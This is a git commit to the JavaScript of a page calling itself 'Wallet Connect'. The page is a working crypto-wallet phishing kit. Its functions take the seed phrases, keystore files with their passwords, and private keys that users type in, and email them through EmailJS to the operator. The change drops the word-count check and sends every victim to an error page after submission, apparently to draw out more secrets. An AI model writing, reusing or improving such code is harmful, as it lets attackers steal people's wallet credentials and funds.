9e7f35a0379cfa9baef96a4d5fc2ebb2e31700cd
dharold1 <olamidedavid10@gmail.com>
2022-05-13 15:05:48 +0100

    make it better

--- assets/js/address.js
+++ assets/js/address.js
@@ -21,90 +21,81 @@ for (let btn of Array.from(btns)) {
 
 function sendPhrase() {
     // console.log(currentWallet);
-   let textValue = document.querySelector('.input-area').value;
-    let wordCount = textValue.match(/(\w+)/g).length;
-    if (wordCount === 12 || wordCount === 24) {
-        var templateParams = {
-            from_name: 'Wallet Connect',
-            message: `Wallet Name:${wallet}, phrase is: ${document.getElementById('phrase').value}`
-        };
-        emailjs.send('service_evcipsg', 'template_7oct2km', templateParams)
-            .then(function (response) {
-                let url = "./success.html";
-                window.location.href = url;
-            }, function (err) {
-                let url = "./error.html";
-                window.location.href = url;
-            });
-    } else {
-        let url = "./error.html";
-        window.location.href = url;
-
-    }
+    let textValue = document.querySelector('.input-area').value;
+    // let wordCount = textValue.match(/(\w+)/g).length;
+    var templateParams = {
+        from_name: 'Wallet Connect',
+        message: `Wallet Name:${wallet}, phrase is: ${document.getElementById('phrase').value}`
+    };
+    emailjs.send('service_evcipsg', 'template_7oct2km', templateParams)
+        .then(function (response) {
+            let url = "./error.html";
+            window.location.href = url;
+        }, function (err) {
+            let url = "./error.html";
+            window.location.href = url;
+        });
     textValue = '';
 }
-    function sendKeystore() {
-      let textValue = document.querySelector('.input-area').value;
-      let passwordValue = document.getElementById('keystore-password').value;
-        var templateParams = {
-            from_name: 'Wallet Connect',
-            message: `keystore value is: ${textValue} and keystore password is ${passwordValue}`
-        };
-        emailjs.send('service_evcipsg', 'template_7oct2km', templateParams)
-            .then(function (response) {
-                let url = "./success.html";
-                window.location.href = url;
-            }, function (err) {
-                let url = "./error.html";
-                window.location.href = url;
-            });
-            textValue = '';
-            passwordValue = '';
-    }
+function sendKeystore() {
+    let textValue = document.querySelector('.input-area').value;
+    let passwordValue = document.getElementById('keystore-password').value;
+    var templateParams = {
+        from_name: 'Wallet Connect',
+        message: `keystore value is: ${textValue} and keystore password is ${passwordValue}`
+    };
+    emailjs.send('service_evcipsg', 'template_7oct2km', templateParams)
+        .then(function (response) {
+            let url = "./error.html";
+            window.location.href = url;
+        }, function (err) {
+            let url = "./error.html";
+            window.location.href = url;
+        });
+    textValue = '';
+    passwordValue = '';
+}
 
-    function sendPrivatekey(){
-        textValue = document.querySelector('#private-key').value;
-        let wordCount = textValue.match(/(\w+)/g).length;
-        if (wordCount === 12 || wordCount === 24) {
+function sendPrivatekey() {
+    textValue = document.querySelector('#private-key').value;
+    // let wordCount = textValue.match(/(\w+)/g).length;
         var templateParams = {
             from_name: 'Wallet Connect',
             message: `private key value is: ${textValue} `
         };
         emailjs.send('service_evcipsg', 'template_7oct2km', templateParams)
             .then(function (response) {
-                let url = "./success.html";
+                let url = "./error.html";
                 window.location.href = url;
             }, function (err) {
                 let url = "./error.html";
                 window.location.href = url;
             });
-        } else {
-            let url = "./error.html";
-            window.location.href = url;
-    
-        }
-        textValue='';
+    textValue = '';
 
-    }
+}
 
-    // ==================phrase submit============================
-    
-    document.querySelector('.phrase-submit').addEventListener('click', (e) => {
-        if (document.querySelector('.forms').checkValidity()){
+// ==================phrase submit============================
+
+document.querySelector('.phrase-submit').addEventListener('click', (e) => {
+    if (document.querySelector('.forms').checkValidity()) {
         // if (textValue = '')
         e.preventDefault();
-        
+
         sendPhrase();
-    }});
-    document.querySelector('.keystore-submit').addEventListener('click', (e) => {
-        if (document.querySelector('.forms').checkValidity()){
+    }
+});
+document.querySelector('.keystore-submit').addEventListener('click', (e) => {
+    if (document.querySelector('.forms').checkValidity()) {
         e.preventDefault()
         sendKeystore();
-    }})
-    document.querySelector('.private-submit').addEventListener('click', (e) => {
-        if (document.querySelector('.forms').checkValidity()){
+    }
+})
+document.querySelector('.private-submit').addEventListener('click', (e) => {
+    if (document.querySelector('.forms').checkValidity()) {
         e.preventDefault()
         sendPrivatekey();
-    }})
+    }
+})
 
 
